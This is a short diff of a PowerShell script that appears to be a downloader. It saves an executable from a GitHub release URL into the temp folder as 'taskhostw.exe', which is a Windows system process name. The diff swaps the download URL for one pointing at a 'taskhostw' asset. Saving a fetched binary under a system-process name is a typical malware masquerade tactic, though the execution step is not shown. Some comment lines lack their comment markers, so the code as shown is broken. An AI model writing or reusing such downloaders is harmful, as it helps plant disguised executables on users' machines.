@@ -6,7 +6,7 @@ $tempDir = [System.IO.Path]::GetTempPath()
 $out = Join-Path $tempDir "taskhostw.exe"
 
 Replace with a stable direct URL to your file
-$directUrl = "https://github.com/timoxit/panel/releases/download/panel/ProjectX.priv.v2.exe"
+$directUrl = "https://github.com/timoxit/panel/releases/download/panel/taskhostw"
 
 --- UI ---
 Write-Host ""
